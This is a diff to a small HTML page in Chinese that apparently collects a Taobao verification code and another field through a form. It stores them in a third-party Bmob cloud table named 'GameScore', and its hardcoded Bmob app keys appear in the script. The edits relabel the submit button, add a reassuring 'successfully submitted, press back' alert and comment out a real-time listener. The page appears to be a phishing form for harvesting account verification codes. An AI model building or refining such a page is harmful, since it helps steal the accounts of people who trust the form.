@@ -22,7 +22,7 @@
        <input type="text" id="nn" /><br>
        <h2 style="text-align:center;font-size:15px"><font face="verdana">淘宝验证码</font></h2>  
        <input type="text" id="mm" /><br><br>
-       <button name="提交" id="send">提交</button> 
+       <button name="提交" id="send">提交信息</button> 
     </p>
   </div>   
   
@@ -59,6 +59,7 @@
       error: function(model, error) {
       }
     });
+      alert("您已成功提交，关闭此对话框后，请点击左上角返回");
       $("body").onclick = copycode();
       }
     }
@@ -67,7 +68,7 @@
        print();
        //alert("您已成功提交，关闭此对话框后，请点击左上角返回");
     });
-      BmobSocketIo.initialize("3f38aebe7d4ee56a45b58e2ecd3b197b");
+      /*BmobSocketIo.initialize("3f38aebe7d4ee56a45b58e2ecd3b197b");
       Bmob.initialize("3f38aebe7d4ee56a45b58e2ecd3b197b", "15c728de9831a0a1e98b10fc1a31c06c");
       BmobSocketIo.onInitListen = function() {
      //订阅GameScore表的数据更新事件
@@ -78,7 +79,7 @@
      if( tablename=="GameScore" ) {
        alert("您已成功提交，关闭此对话框后，请点击左上角返回");
      }
-   };
+   };*/
     
   </script>
 </body>
